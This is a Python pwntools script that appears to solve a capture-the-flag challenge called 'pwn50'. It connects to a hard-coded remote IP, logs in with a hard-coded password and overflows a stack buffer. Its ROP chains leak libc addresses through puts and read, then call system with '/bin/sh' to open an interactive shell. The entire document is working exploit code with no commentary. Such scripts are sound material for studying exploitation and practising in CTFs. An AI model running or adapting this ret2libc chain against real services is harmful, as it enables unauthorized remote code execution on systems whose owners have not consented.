# coding:utf-8
from pwn import *
debug = 0
context.log_level='debug'
elf = ELF('./pwn50')
#libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
if debug:
    p = process('./pwn50')#,env={'LD_PRELOAD':'/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so'})
    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x64')
#    gdb.attach(p)
else:
    p = remote('47.104.16.75', 9000)#  47.104.16.75 9000
    libc = ELF('./libc6_2.19-0ubuntu6.14_amd64.so')

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

p.recvuntil('username: ')
p.sendline('admin')

p.recvuntil('password: ')
p.sendline('T6OBSh2i')

p.recvuntil('Your choice: ')

payload = '3'*0x50
payload += p64(0)
#payload += p64(0x4008BF)#menu
#payload += p64(elf.plt['puts'])
payload += p64(0x400b03)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x4008BF)
#0x0000000000400b03 : pop rdi ; ret
#payload += p64(elf.got['puts']) 
#ROPgadget --binary pwn50 --only "pop|ret" | grep rdi
p.sendline(payload)

data = u64(p.recv(6).ljust(8,'\x00'))
print 'puts_addr:'+hex(data)

p.recvuntil('Your choice: ')

payload = '3'*0x50
payload += p64(0)
#payload += p64(0x4008BF)#menu
#payload += p64(elf.plt['puts'])
payload += p64(0x400b03)
payload += p64(elf.got['read'])
payload += p64(elf.plt['puts'])
payload += p64(0x4008BF)

p.sendline(payload)

data = u64(p.recv(6).ljust(8,'\x00'))
print 'raed_addr:'+hex(data)

libc_base = data - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + 0x180543	#0x139fb3


p.recvuntil('Your choice: ')

payload = '3'*0x50
payload += p64(0)
#payload += p64(0x4008BF)#menu
#payload += p64(elf.plt['puts'])
payload += p64(0x400b03)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(0x4008BF)

p.sendline(payload)



p.interactive()